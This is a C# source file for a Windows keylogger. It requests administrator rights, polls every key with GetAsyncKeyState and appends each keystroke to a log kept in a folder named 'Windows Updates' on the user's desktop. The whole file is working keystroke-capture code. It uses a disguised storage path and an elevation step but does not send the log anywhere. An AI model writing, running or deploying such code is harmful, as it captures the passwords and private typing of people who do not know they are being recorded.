using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Principal;
using System.Diagnostics;

namespace KeyLogger
{
    class Program
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern short GetAsyncKeyState(int virtualKeyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int GetKeyboardState(byte[] keystate);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int MapVirtualKey(uint uCode, int uMapType);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

        static void Main(string[] args)
        {
            // Check if the current session has administrative privileges
            bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

            if (!isAdmin)
            {
                // Relaunch the script with elevated permissions
                Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Verb = "runas",
                    Arguments = $"\"{Process.GetCurrentProcess().MainModule.FileName}\""
                });
                return;
            }

            // The rest of the script goes here and will run with elevated permissions

            StartKeyLogger();
        }

        static void StartKeyLogger(string path = @"%USERPROFILE%\Desktop\Windows Updates\Transcript.txt")
        {
            // create output file
            path = Environment.ExpandEnvironmentVariables(path);
            Directory.CreateDirectory(Path.GetDirectoryName(path));
            File.WriteAllText(path, "");

            try
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Recording key presses. Press CTRL+C to see results.");

                // create endless loop. When user presses CTRL+C, finally-block
                // executes and shows the collected key presses
                while (true)
                {
                    System.Threading.Thread.Sleep(1);

                    // scan all ASCII codes above 8
                    for (int ascii = 9; ascii <= 254; ascii++)
                    {
                        // get current key state
                        short state = GetAsyncKeyState(ascii);

                        // is key pressed?
                        if (state == -32767)
                        {
                            Console.CapsLock.GetHashCode();

                            // translate scan code to real code
                            int virtualKey = MapVirtualKey((uint)ascii, 3);

                            // get keyboard state for virtual keys
                            byte[] kbstate = new byte[256];
                            int checkkbstate = GetKeyboardState(kbstate);

                            // prepare a StringBuilder to receive input key
                            StringBuilder mychar = new StringBuilder(2);

                            // translate virtual key
                            int success = ToUnicode((uint)ascii, (uint)virtualKey, kbstate, mychar, mychar.Capacity, 0);

                            if (success > 0)
                            {
                                // add key to logger file
                                File.AppendAllText(path, mychar.ToString(), Encoding.Unicode);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(ex.Message);
            }
            finally
            {
                // open logger file in Notepad
                Process.Start("notepad.exe", path);
            }
        }
    }
}
